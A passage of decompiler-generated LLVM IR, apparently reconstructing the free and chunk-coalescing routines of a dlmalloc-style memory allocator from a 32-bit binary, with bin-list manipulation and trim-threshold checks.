  %v3_805281c = inttoptr i32 %v2_8052818 to i32*
  store i32 %v1_8052810, i32* %v3_805281c, align 4
  %v0_805281f = load i32, i32* %eax.global-to-local, align 4
  %v1_805281f = urem i32 %v0_805281f, 2
  %v2_805281f = icmp eq i32 %v1_805281f, 0
  store i32 %v1_805281f, i32* %eax.global-to-local, align 4
  %v1_8052824 = icmp eq i1 %v2_805281f, false
  br i1 %v1_8052824, label %dec_label_pc_8052845, label %dec_label_pc_8052826

dec_label_pc_8052826:                             ; preds = %dec_label_pc_8052818
  %v0_8052826 = load i32, i32* @ebx, align 4
  %v1_8052826 = add i32 %v0_8052826, 8
  %v2_8052826 = inttoptr i32 %v1_8052826 to i32*
  %v3_8052826 = load i32, i32* %v2_8052826, align 4
  store i32 %v3_8052826, i32* @edx, align 4
  %v1_8052829 = add i32 %v0_8052826, 12
  %v2_8052829 = inttoptr i32 %v1_8052829 to i32*
  %v3_8052829 = load i32, i32* %v2_8052829, align 4
  store i32 %v3_8052829, i32* %eax.global-to-local, align 4
  %v1_805282c = add i32 %v3_8052826, 12
  %v2_805282c = inttoptr i32 %v1_805282c to i32*
  %v3_805282c = load i32, i32* %v2_805282c, align 4
  store i32 %v3_805282c, i32* @esi, align 4
  %v12_805282f = icmp eq i32 %v3_805282c, %v0_8052826
  %v1_8052831 = icmp eq i1 %v12_805282f, false
  br i1 %v1_8052831, label %dec_label_pc_8052838, label %dec_label_pc_8052833

dec_label_pc_8052833:                             ; preds = %dec_label_pc_8052826
  %v1_8052833 = add i32 %v3_8052829, 8
  %v2_8052833 = inttoptr i32 %v1_8052833 to i32*
  %v3_8052833 = load i32, i32* %v2_8052833, align 4
  %v15_8052833 = icmp eq i32 %v3_8052833, %v3_805282c
  br i1 %v15_8052833, label %dec_label_pc_805283d, label %dec_label_pc_8052838

dec_label_pc_8052838:                             ; preds = %dec_label_pc_8052833, %dec_label_pc_8052826, %dec_label_pc_80527fb, %dec_label_pc_80527e8
  %v0_8052838 = call i32 @function_8052ad4()
  store i32 %v0_8052838, i32* %eax.global-to-local, align 4
  %v1_805283f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805283d

dec_label_pc_805283d:                             ; preds = %dec_label_pc_8052833, %dec_label_pc_8052838
  %v1_805283f = phi i32 [ %v3_8052826, %dec_label_pc_8052833 ], [ %v1_805283f.pre, %dec_label_pc_8052838 ]
  %v0_805283f = phi i32 [ %v3_8052829, %dec_label_pc_8052833 ], [ %v0_8052838, %dec_label_pc_8052838 ]
  %v0_805283d = load i32, i32* @edi, align 4
  %v1_805283d = load i32, i32* %ebp.global-to-local, align 4
  %v2_805283d = add i32 %v1_805283d, %v0_805283d
  store i32 %v2_805283d, i32* @edi, align 4
  %v2_805283f = add i32 %v1_805283f, 12
  %v3_805283f = inttoptr i32 %v2_805283f to i32*
  store i32 %v0_805283f, i32* %v3_805283f, align 4
  %v0_8052842 = load i32, i32* @edx, align 4
  %v1_8052842 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052842 = add i32 %v1_8052842, 8
  %v3_8052842 = inttoptr i32 %v2_8052842 to i32*
  store i32 %v0_8052842, i32* %v3_8052842, align 4
  br label %dec_label_pc_8052845

dec_label_pc_8052845:                             ; preds = %dec_label_pc_8052818, %dec_label_pc_805283d
  store i32 %v1_8052790, i32* %eax.global-to-local, align 4
  %v3_8052849 = load i32, i32* %v2_8052849, align 4
  store i32 %v3_8052849, i32* @edx, align 4
  %v0_805284c = load i32, i32* @ecx, align 4
  store i32 %v0_805284c, i32* %v2_8052849, align 4
  %v0_805284f = load i32, i32* @edi, align 4
  %v1_8052851 = or i32 %v0_805284f, 1
  store i32 %v1_8052851, i32* %eax.global-to-local, align 4
  %v0_8052854 = load i32, i32* @ecx, align 4
  %v1_8052854 = load i32, i32* @edx, align 4
  %v2_8052854 = add i32 %v1_8052854, 12
  %v3_8052854 = inttoptr i32 %v2_8052854 to i32*
  store i32 %v0_8052854, i32* %v3_8052854, align 4
  %v0_8052857 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052857 = load i32, i32* @ecx, align 4
  %v2_8052857 = add i32 %v1_8052857, 4
  %v3_8052857 = inttoptr i32 %v2_8052857 to i32*
  store i32 %v0_8052857, i32* %v3_8052857, align 4
  store i32 %v1_8052790, i32* %eax.global-to-local, align 4
  %v0_805285e = load i32, i32* @edx, align 4
  %v1_805285e = load i32, i32* @ecx, align 4
  %v2_805285e = add i32 %v1_805285e, 8
  %v3_805285e = inttoptr i32 %v2_805285e to i32*
  store i32 %v0_805285e, i32* %v3_805285e, align 4
  %v0_8052861 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052861 = load i32, i32* @ecx, align 4
  %v2_8052861 = add i32 %v1_8052861, 12
  %v3_8052861 = inttoptr i32 %v2_8052861 to i32*
  store i32 %v0_8052861, i32* %v3_8052861, align 4
  %v0_8052864 = load i32, i32* @edi, align 4
  %v1_8052864 = load i32, i32* @ecx, align 4
  %v3_8052864 = add i32 %v1_8052864, %v0_8052864
  %v4_8052864 = inttoptr i32 %v3_8052864 to i32*
  store i32 %v0_8052864, i32* %v4_8052864, align 4
  br label %dec_label_pc_8052879

dec_label_pc_8052869:                             ; preds = %dec_label_pc_8052808
  %v0_8052869 = load i32, i32* @edi, align 4
  %v2_8052869 = add i32 %v0_8052869, %v1_8052810
  %v1_805286c = or i32 %v2_8052869, 1
  store i32 %v1_805286c, i32* %eax.global-to-local, align 4
  %v1_805286f = load i32, i32* @ecx, align 4
  %v2_805286f = add i32 %v1_805286f, 4
  %v3_805286f = inttoptr i32 %v2_805286f to i32*
  store i32 %v1_805286c, i32* %v3_805286f, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8052876 = load i32, i32* @ecx, align 4
  store i32 %v0_8052876, i32* %v3_8052876, align 4
  br label %dec_label_pc_8052879

dec_label_pc_8052879:                             ; preds = %dec_label_pc_8052845, %dec_label_pc_8052869
  store i32 %v3_80527cb, i32* @ecx, align 4
  %v1_805287d = icmp eq i32 %v3_80527cb, 0
  %v1_805287f = icmp eq i1 %v1_805287d, false
  br i1 %v1_805287f, label %dec_label_pc_80527cb, label %dec_label_pc_8052885

dec_label_pc_8052885:                             ; preds = %dec_label_pc_8052879, %dec_label_pc_80527b7
  store i32 %v4_80527af, i32* @ecx, align 4
  %v15_8052889 = icmp eq i32 %v0_80527c5, %v4_80527af
  br i1 %v15_8052889, label %dec_label_pc_805290d, label %dec_label_pc_805288f

dec_label_pc_805288f:                             ; preds = %dec_label_pc_8052885
  %v4_805288f = add i32 %v0_80527c5, 4
  br label %dec_label_pc_80527b7

dec_label_pc_8052899:                             ; preds = %dec_label_pc_80528a8.preheader, %dec_label_pc_8052899
  %v1_805289d20 = phi i32 [ 1, %dec_label_pc_80528a8.preheader ], [ %v0_80528a8.pre, %dec_label_pc_8052899 ]
  %v2_805289d = mul i32 %v1_805289d20, 8
  %v4_805289d = add i32 %v3_805289d, %v2_805289d
  store i32 %v4_805289d, i32* %eax.global-to-local, align 4
  %v1_80528a1 = add i32 %v1_805289d20, 1
  store i32 %v1_80528a1, i32* %edx.global-to-local, align 4
  %v2_80528a2 = add i32 %v4_805289d, 12
  %v3_80528a2 = inttoptr i32 %v2_80528a2 to i32*
  store i32 %v4_805289d, i32* %v3_80528a2, align 4
  %v0_80528a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528a5 = add i32 %v0_80528a5, 8
  %v3_80528a5 = inttoptr i32 %v2_80528a5 to i32*
  store i32 %v0_80528a5, i32* %v3_80528a5, align 4
  %v0_80528a8.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80528ab = icmp sgt i32 %v0_80528a8.pre, 95
  br i1 %v7_80528ab, label %dec_label_pc_80528ad, label %dec_label_pc_8052899

dec_label_pc_80528ad:                             ; preds = %dec_label_pc_8052899
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80528b1 = add i32 %tmp11, 864
  %v2_80528b1 = inttoptr i32 %v1_80528b1 to i32*
  %v3_80528b1 = load i32, i32* %v2_80528b1, align 4
  %v4_80528b1 = or i32 %v3_80528b1, 1
  store i32 %v4_80528b1, i32* %v2_80528b1, align 4
  %v0_80528b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80528b8 = add i32 %v0_80528b8, 840
  %v2_80528b8 = inttoptr i32 %v1_80528b8 to i32*
  store i32 0, i32* %v2_80528b8, align 4
  %v0_80528c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80528c2 = add i32 %v0_80528c2, 852
  %v2_80528c2 = inttoptr i32 %v1_80528c2 to i32*
  store i32 65536, i32* %v2_80528c2, align 4
  %v0_80528cc = load i32, i32* %eax.global-to-local, align 4
  %v1_80528cc = add i32 %v0_80528cc, 844
  %v2_80528cc = inttoptr i32 %v1_80528cc to i32*
  store i32 262144, i32* %v2_80528cc, align 4
  %v0_80528d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80528d6 = add i32 %v0_80528d6, 836
  %v2_80528d6 = inttoptr i32 %v1_80528d6 to i32*
  store i32 262144, i32* %v2_80528d6, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_80528e7 = load i32, i32* %arg1, align 4
  %v1_80528e9 = urem i32 %v2_80528e7, 4
  %v1_80528ec = or i32 %v1_80528e9, 72
  store i32 %v1_80528ec, i32* %arg1, align 4
  %v0_80528f1 = load i32, i32* @edx, align 4
  %v1_80528f3 = add i32 %v0_80528f1, 52
  store i32 %v1_80528f3, i32* %eax.global-to-local, align 4
  %v2_80528f6 = add i32 %v0_80528f1, 44
  %v3_80528f6 = inttoptr i32 %v2_80528f6 to i32*
  store i32 %v1_80528f3, i32* %v3_80528f6, align 4
  %v1_80528fb = call i32 @function_8053448(i32 30)
  store i32 %v1_80528fb, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8052907 = add i32 %tmp11, 860
  %v3_8052907 = inttoptr i32 %v2_8052907 to i32*
  store i32 %v1_80528fb, i32* %v3_8052907, align 4
  br label %dec_label_pc_805290d

dec_label_pc_805290d:                             ; preds = %dec_label_pc_8052885, %dec_label_pc_80528ad
  store i32 %v0_8052770, i32* @ebx, align 4
  store i32 %v0_805276f, i32* @esi, align 4
  store i32 %v0_805276e, i32* @edi, align 4
  %v0_8052914 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052914

; uselistorder directives
  uselistorder i32 %v0_80528a5, { 1, 0 }
  uselistorder i32 %v0_8052864, { 1, 0 }
  uselistorder i32 %v1_805281f, { 1, 0 }
  uselistorder i32 %v2_8052818, { 1, 0 }
  uselistorder i32 %v1_8052810, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805281c, { 1, 0 }
  uselistorder i32 %v3_80527cb, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80527e8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80527c5, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8052876, { 1, 0 }
  uselistorder i32 %v1_8052790, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_805290d, { 1, 0 }
  uselistorder label %dec_label_pc_8052899, { 1, 0 }
  uselistorder label %dec_label_pc_8052879, { 1, 0 }
  uselistorder label %dec_label_pc_8052845, { 1, 0 }
  uselistorder label %dec_label_pc_805283d, { 1, 0 }
  uselistorder label %dec_label_pc_8052808, { 1, 0 }
}

define i32 @function_8052915(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052915:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052915 = load i32, i32* @ebp, align 4
  %v0_8052916 = load i32, i32* @edi, align 4
  %v0_8052917 = load i32, i32* @esi, align 4
  %v0_8052918 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052920 = icmp eq i32 %arg1, 0
  br i1 %v1_8052920, label %dec_label_pc_8052aa9, label %dec_label_pc_8052928

dec_label_pc_8052928:                             ; preds = %dec_label_pc_8052915
  %v2_8052933 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052933, i32* @eax, align 4
  %v2_8052938 = call i32 @function_80535d2(i32 %v2_8052933, i32 134559183)
  store i32 %v2_8052938, i32* %eax.global-to-local, align 4
  %v1_8052944 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d770.340 to i32))
  %v1_8052949 = add i32 %arg1, -8
  store i32 %v1_8052949, i32* @ecx, align 4
  %v0_805294c = load i8, i8* @global_var_8063be0.341, align 1
  %v1_805294c = sext i8 %v0_805294c to i32
  store i32 %v1_805294c, i32* %eax.global-to-local, align 4
  %v1_8052954 = add i32 %arg1, -4
  %v2_8052954 = inttoptr i32 %v1_8052954 to i32*
  %v3_8052954 = load i32, i32* %v2_8052954, align 4
  %v1_8052959 = and i32 %v3_8052954, -4
  %v4_8052959 = trunc i32 %v1_8052959 to i8
  store i32 %v1_8052959, i32* @ebx, align 4
  %v8_805295e = icmp ugt i8 %v4_8052959, %v0_805294c
  br i1 %v8_805295e, label %dec_label_pc_8052980, label %dec_label_pc_8052960

dec_label_pc_8052960:                             ; preds = %dec_label_pc_8052928
  %v2_8052960 = udiv i32 %v3_8052954, 8
  %v1_8052963 = or i32 %v1_805294c, 3
  %v3_8052963 = trunc i32 %v1_8052963 to i8
  store i32 %v1_8052963, i32* %eax.global-to-local, align 4
  store i8 %v3_8052963, i8* @global_var_8063be0.341, align 32
  %v1_805296b = mul nuw i32 %v2_8052960, 4
  %v2_805296b = add i32 %v1_805296b, ptrtoint (i8* @global_var_8063be0.341 to i32)
  store i32 %v2_805296b, i32* @edx, align 4
  %v1_8052972 = add i32 %v1_805296b, add (i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32 -4)
  %v2_8052972 = inttoptr i32 %v1_8052972 to i32*
  %v3_8052972 = load i32, i32* %v2_8052972, align 4
  store i32 %v3_8052972, i32* %eax.global-to-local, align 4
  %v3_8052975 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8052972, i32* %v3_8052975, align 4
  %v0_8052978 = load i32, i32* @ecx, align 4
  %v1_8052978 = load i32, i32* @edx, align 4
  %v2_8052978 = add i32 %v1_8052978, -4
  %v3_8052978 = inttoptr i32 %v2_8052978 to i32*
  store i32 %v0_8052978, i32* %v3_8052978, align 4
  br label %dec_label_pc_8052a98

dec_label_pc_8052980:                             ; preds = %dec_label_pc_8052928
  %v1_8052980 = trunc i32 %v3_8052954 to i8
  %v2_8052980 = and i8 %v1_8052980, 2
  %v3_8052980 = icmp eq i8 %v2_8052980, 0
  %v5_8052980 = zext i8 %v2_8052980 to i32
  %v7_8052980 = and i32 %v3_8052954, -256
  %v8_8052980 = or i32 %v5_8052980, %v7_8052980
  store i32 %v8_8052980, i32* @edx, align 4
  %v1_8052983 = icmp eq i1 %v3_8052980, false
  br i1 %v1_8052983, label %dec_label_pc_8052a78, label %dec_label_pc_8052989

dec_label_pc_8052989:                             ; preds = %dec_label_pc_8052980
  %v1_8052989 = or i32 %v1_805294c, 1
  %v3_8052989 = trunc i32 %v1_8052989 to i8
  store i32 %v1_8052989, i32* %eax.global-to-local, align 4
  %v2_805298c = add i32 %v1_8052959, %v1_8052949
  store i32 %v2_805298c, i32* @esi, align 4
  store i8 %v3_8052989, i8* @global_var_8063be0.341, align 32
  %v1_8052994 = add i32 %v2_805298c, 4
  %v2_8052994 = inttoptr i32 %v1_8052994 to i32*
  %v3_8052994 = load i32, i32* %v2_8052994, align 4
  store i32 %v3_8052994, i32* %eax.global-to-local, align 4
  %v2_805299b = inttoptr i32 %v1_8052954 to i8*
  %v3_805299b = load i8, i8* %v2_805299b, align 1
  %v4_805299b = urem i8 %v3_805299b, 2
  %v5_805299b = icmp eq i8 %v4_805299b, 0
  %v1_805299f = icmp eq i1 %v5_805299b, false
  br i1 %v1_805299f, label %dec_label_pc_80529c2, label %dec_label_pc_80529a1

dec_label_pc_80529a1:                             ; preds = %dec_label_pc_8052989
  %v2_80529a1 = inttoptr i32 %v1_8052949 to i32*
  %v3_80529a1 = load i32, i32* %v2_80529a1, align 4
  store i32 %v3_80529a1, i32* @ebp, align 4
  %v2_80529a6 = sub i32 %v1_8052949, %v3_80529a1
  store i32 %v2_80529a6, i32* %eax.global-to-local, align 4
  %v1_80529a8 = add i32 %v2_80529a6, 8
  %v2_80529a8 = inttoptr i32 %v1_80529a8 to i32*
  %v3_80529a8 = load i32, i32* %v2_80529a8, align 4
  store i32 %v3_80529a8, i32* @edi, align 4
  %v1_80529ab = add i32 %v2_80529a6, 12
  %v2_80529ab = inttoptr i32 %v1_80529ab to i32*
  %v3_80529ab = load i32, i32* %v2_80529ab, align 4
  store i32 %v3_80529ab, i32* @edx, align 4
  %v1_80529ae = add i32 %v3_80529a8, 12
  %v2_80529ae = inttoptr i32 %v1_80529ae to i32*
  %v3_80529ae = load i32, i32* %v2_80529ae, align 4
  store i32 %v3_80529ae, i32* @ecx, align 4
  %v12_80529b1 = icmp eq i32 %v3_80529ae, %v2_80529a6
  %v1_80529b3 = icmp eq i1 %v12_80529b1, false
  br i1 %v1_80529b3, label %dec_label_pc_80529f1, label %dec_label_pc_80529b5

dec_label_pc_80529b5:                             ; preds = %dec_label_pc_80529a1
  %v1_80529b5 = add i32 %v3_80529ab, 8
  %v2_80529b5 = inttoptr i32 %v1_80529b5 to i32*
  %v3_80529b5 = load i32, i32* %v2_80529b5, align 4
  %v15_80529b5 = icmp eq i32 %v3_80529b5, %v3_80529ae
  %v1_80529b8 = icmp eq i1 %v15_80529b5, false
  br i1 %v1_80529b8, label %dec_label_pc_80529f1, label %dec_label_pc_80529ba

dec_label_pc_80529ba:                             ; preds = %dec_label_pc_80529b5
  %v2_80529ba = add i32 %v3_80529a1, %v1_8052959
  store i32 %v2_80529ba, i32* @ebx, align 4
  store i32 %v3_80529ab, i32* %v2_80529ae, align 4
  %v0_80529bf = load i32, i32* @edi, align 4
  %v1_80529bf = load i32, i32* @edx, align 4
  %v2_80529bf = add i32 %v1_80529bf, 8
  %v3_80529bf = inttoptr i32 %v2_80529bf to i32*
  store i32 %v0_80529bf, i32* %v3_80529bf, align 4
  %v0_80529c9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80529c2

dec_label_pc_80529c2:                             ; preds = %dec_label_pc_8052989, %dec_label_pc_80529ba
  %v1_80529d5 = phi i32 [ %v2_805298c, %dec_label_pc_8052989 ], [ %v0_80529c9.pre, %dec_label_pc_80529ba ]
  %v1_80529c6 = and i32 %v3_8052994, -4
  store i32 %v1_80529c6, i32* @ebp, align 4
  %v1_80529c9 = load i32, i32* @global_var_8063c0c.342, align 4
  %v12_80529c9 = icmp eq i32 %v1_80529d5, %v1_80529c9
  br i1 %v12_80529c9, label %dec_label_pc_8052a23, label %dec_label_pc_80529d1

dec_label_pc_80529d1:                             ; preds = %dec_label_pc_80529c2
  %v2_80529d1 = add i32 %v1_80529d5, 4
  %v3_80529d1 = add i32 %v2_80529d1, %v1_80529c6
  %v4_80529d1 = inttoptr i32 %v3_80529d1 to i32*
  %v5_80529d1 = load i32, i32* %v4_80529d1, align 4
  store i32 %v5_80529d1, i32* %eax.global-to-local, align 4
  %v3_80529d5 = inttoptr i32 %v2_80529d1 to i32*
  store i32 %v1_80529c6, i32* %v3_80529d5, align 4
  %v0_80529d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80529d8 = urem i32 %v0_80529d8, 2
  %v2_80529d8 = icmp eq i32 %v1_80529d8, 0
  store i32 %v1_80529d8, i32* %eax.global-to-local, align 4
  %v1_80529dd = icmp eq i1 %v2_80529d8, false
  br i1 %v1_80529dd, label %dec_label_pc_80529fe, label %dec_label_pc_80529df

dec_label_pc_80529df:                             ; preds = %dec_label_pc_80529d1
  %v0_80529df = load i32, i32* @esi, align 4
  %v1_80529df = add i32 %v0_80529df, 8
  %v2_80529df = inttoptr i32 %v1_80529df to i32*
  %v3_80529df = load i32, i32* %v2_80529df, align 4
  store i32 %v3_80529df, i32* @edx, align 4
  %v1_80529e2 = add i32 %v0_80529df, 12
  %v2_80529e2 = inttoptr i32 %v1_80529e2 to i32*
  %v3_80529e2 = load i32, i32* %v2_80529e2, align 4
  store i32 %v3_80529e2, i32* %eax.global-to-local, align 4
  %v1_80529e5 = add i32 %v3_80529df, 12
  %v2_80529e5 = inttoptr i32 %v1_80529e5 to i32*
  %v3_80529e5 = load i32, i32* %v2_80529e5, align 4
  store i32 %v3_80529e5, i32* @edi, align 4
  %v12_80529e8 = icmp eq i32 %v3_80529e5, %v0_80529df
  %v1_80529ea = icmp eq i1 %v12_80529e8, false
  br i1 %v1_80529ea, label %dec_label_pc_80529f1, label %dec_label_pc_80529ec

dec_label_pc_80529ec:                             ; preds = %dec_label_pc_80529df
  %v1_80529ec = add i32 %v3_80529e2, 8
  %v2_80529ec = inttoptr i32 %v1_80529ec to i32*
  %v3_80529ec = load i32, i32* %v2_80529ec, align 4
  %v15_80529ec = icmp eq i32 %v3_80529ec, %v3_80529e5
  br i1 %v15_80529ec, label %dec_label_pc_80529f6, label %dec_label_pc_80529f1

dec_label_pc_80529f1:                             ; preds = %dec_label_pc_80529ec, %dec_label_pc_80529df, %dec_label_pc_80529b5, %dec_label_pc_80529a1
  %v0_80529f1 = call i32 @function_8052ad4()
  store i32 %v0_80529f1, i32* %eax.global-to-local, align 4
  %v1_80529f6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80529f6

dec_label_pc_80529f6:                             ; preds = %dec_label_pc_80529ec, %dec_label_pc_80529f1
  %v1_80529f6 = phi i32 [ %v3_80529df, %dec_label_pc_80529ec ], [ %v1_80529f6.pre, %dec_label_pc_80529f1 ]
  %v0_80529f6 = phi i32 [ %v3_80529e2, %dec_label_pc_80529ec ], [ %v0_80529f1, %dec_label_pc_80529f1 ]
  %v2_80529f6 = add i32 %v1_80529f6, 12
  %v3_80529f6 = inttoptr i32 %v2_80529f6 to i32*
  store i32 %v0_80529f6, i32* %v3_80529f6, align 4
  %v0_80529f9 = load i32, i32* @edx, align 4
  %v1_80529f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80529f9 = add i32 %v1_80529f9, 8
  %v3_80529f9 = inttoptr i32 %v2_80529f9 to i32*
  store i32 %v0_80529f9, i32* %v3_80529f9, align 4
  %v0_80529fc = load i32, i32* @ebx, align 4
  %v1_80529fc = load i32, i32* @ebp, align 4
  %v2_80529fc = add i32 %v1_80529fc, %v0_80529fc
  store i32 %v2_80529fc, i32* @ebx, align 4
  br label %dec_label_pc_80529fe

dec_label_pc_80529fe:                             ; preds = %dec_label_pc_80529d1, %dec_label_pc_80529f6
  %v0_80529fe = load i32, i32* @global_var_8063c1c.360, align 4
  store i32 %v0_80529fe, i32* %eax.global-to-local, align 4
  %v0_8052a03 = load i32, i32* @ecx, align 4
  %v1_8052a03 = add i32 %v0_8052a03, 12
  %v2_8052a03 = inttoptr i32 %v1_8052a03 to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_8052a03, align 4
  %v0_8052a0a = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a0a = load i32, i32* @ecx, align 4
  %v2_8052a0a = add i32 %v1_8052a0a, 8
  %v3_8052a0a = inttoptr i32 %v2_8052a0a to i32*
  store i32 %v0_8052a0a, i32* %v3_8052a0a, align 4
  %v0_8052a0d = load i32, i32* @ebx, align 4
  %v1_8052a0d = load i32, i32* @ecx, align 4
  %v3_8052a0d = add i32 %v1_8052a0d, %v0_8052a0d
  %v4_8052a0d = inttoptr i32 %v3_8052a0d to i32*
  store i32 %v0_8052a0d, i32* %v4_8052a0d, align 4
  %v0_8052a10 = load i32, i32* @ecx, align 4
  %v1_8052a10 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a10 = add i32 %v1_8052a10, 12
  %v3_8052a10 = inttoptr i32 %v2_8052a10 to i32*
  store i32 %v0_8052a10, i32* %v3_8052a10, align 4
  %v0_8052a13 = load i32, i32* @ebx, align 4
  %v1_8052a15 = or i32 %v0_8052a13, 1
  store i32 %v1_8052a15, i32* %eax.global-to-local, align 4
  %v0_8052a18 = load i32, i32* @ecx, align 4
  store i32 %v0_8052a18, i32* @global_var_8063c1c.360, align 4
  %v2_8052a1e = add i32 %v0_8052a18, 4
  %v3_8052a1e = inttoptr i32 %v2_8052a1e to i32*
  store i32 %v1_8052a15, i32* %v3_8052a1e, align 4
  br label %dec_label_pc_8052a33

dec_label_pc_8052a23:                             ; preds = %dec_label_pc_80529c2
  %v0_8052a23 = load i32, i32* @ebx, align 4
  %v2_8052a23 = add i32 %v0_8052a23, %v1_80529c6
  store i32 %v2_8052a23, i32* @ebx, align 4
  %v1_8052a27 = or i32 %v2_8052a23, 1
  store i32 %v1_8052a27, i32* %eax.global-to-local, align 4
  %v1_8052a2a = load i32, i32* @ecx, align 4
  %v2_8052a2a = add i32 %v1_8052a2a, 4
  %v3_8052a2a = inttoptr i32 %v2_8052a2a to i32*
  store i32 %v1_8052a27, i32* %v3_8052a2a, align 4
  %v0_8052a2d = load i32, i32* @ecx, align 4
  store i32 %v0_8052a2d, i32* @global_var_8063c0c.342, align 4
  br label %dec_label_pc_8052a33

dec_label_pc_8052a33:                             ; preds = %dec_label_pc_80529fe, %dec_label_pc_8052a23
  %v0_8052a33 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8052a33, 131072
  br i1 %tmp21, label %dec_label_pc_8052a98, label %dec_label_pc_8052a3b

dec_label_pc_8052a3b:                             ; preds = %dec_label_pc_8052a33
  %v0_8052a3b = load i8, i8* @global_var_8063be0.341, align 32
  %v1_8052a3b = and i8 %v0_8052a3b, 2
  %v2_8052a3b = icmp eq i8 %v1_8052a3b, 0
  br i1 %v2_8052a3b, label %dec_label_pc_8052a54, label %dec_label_pc_8052a44

dec_label_pc_8052a44:                             ; preds = %dec_label_pc_8052a3b
  %v2_8052a4c = call i32 @function_805276d(i32* bitcast (i8* @global_var_8063be0.341 to i32*))
  store i32 %v2_8052a4c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a54

dec_label_pc_8052a54:                             ; preds = %dec_label_pc_8052a3b, %dec_label_pc_8052a44
  %v0_8052a54 = load i32, i32* @global_var_8063c0c.342, align 4
  store i32 %v0_8052a54, i32* %eax.global-to-local, align 4
  %v1_8052a59 = add i32 %v0_8052a54, 4
  %v2_8052a59 = inttoptr i32 %v1_8052a59 to i32*
  %v3_8052a59 = load i32, i32* %v2_8052a59, align 4
  %v1_8052a5c = and i32 %v3_8052a59, -4
  store i32 %v1_8052a5c, i32* %eax.global-to-local, align 4
  %v1_8052a5f = load i32, i32* @global_var_8063f24.358, align 4
  %v7_8052a5f = icmp ult i32 %v1_8052a5c, %v1_8052a5f
  br i1 %v7_8052a5f, label %dec_label_pc_8052a98, label %dec_label_pc_8052a67

dec_label_pc_8052a67:                             ; preds = %dec_label_pc_8052a54
  store i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32* @edx, align 4
  %v0_8052a6c = load i32, i32* @global_var_8063f28.356, align 8
  store i32 %v0_8052a6c, i32* @eax, align 4
  %v0_8052a71 = call i32 @function_80526e0()
  store i32 %v0_8052a71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a98

dec_label_pc_8052a78:                             ; preds = %dec_label_pc_8052980
  %v2_8052a78 = inttoptr i32 %v1_8052949 to i32*
  %v3_8052a78 = load i32, i32* %v2_8052a78, align 4
  %v0_8052a7b = load i32, i32* @global_var_8063f30.349, align 16
  %v1_8052a7b = add i32 %v0_8052a7b, -1
  store i32 %v1_8052a7b, i32* @global_var_8063f30.349, align 16
  %v2_8052a81 = add i32 %v3_8052a78, %v1_8052959
  store i32 %v2_8052a81, i32* %eax.global-to-local, align 4
  %v2_8052a84 = sub i32 %v1_8052949, %v3_8052a78
  %v0_8052a8a = load i32, i32* @global_var_8063f44.352, align 4
  %v2_8052a8a = sub i32 %v0_8052a8a, %v2_8052a81
  store i32 %v2_8052a8a, i32* @global_var_8063f44.352, align 4
  %v4_8052a90 = inttoptr i32 %v2_8052a84 to i32*
  %v5_8052a90 = call i32 @function_8053a84(i32* %v4_8052a90, i32 %v2_8052a81, i32 %v1_8052959, i32 %v1_8052959)
  store i32 %v5_8052a90, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a98

dec_label_pc_8052a98:                             ; preds = %dec_label_pc_8052a54, %dec_label_pc_8052a33, %dec_label_pc_8052a67, %dec_label_pc_8052960, %dec_label_pc_8052a78
  store i32 %v2_8052933, i32* @eax, align 4
  %v2_8052aa1 = call i32 @function_80535d2(i32 %v2_8052933, i32 1)
  store i32 %v2_8052aa1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052aa9

dec_label_pc_8052aa9:                             ; preds = %dec_label_pc_8052915, %dec_label_pc_8052a98
  %.0 = phi i32 [ undef, %dec_label_pc_8052915 ], [ %v2_8052aa1, %dec_label_pc_8052a98 ]
  store i32 %v0_8052918, i32* @ebx, align 4
  store i32 %v0_8052917, i32* @esi, align 4
  store i32 %v0_8052916, i32* @edi, align 4
  store i32 %v0_8052915, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8052a78, { 1, 0 }
  uselistorder i32 %v0_8052a0d, { 1, 0 }
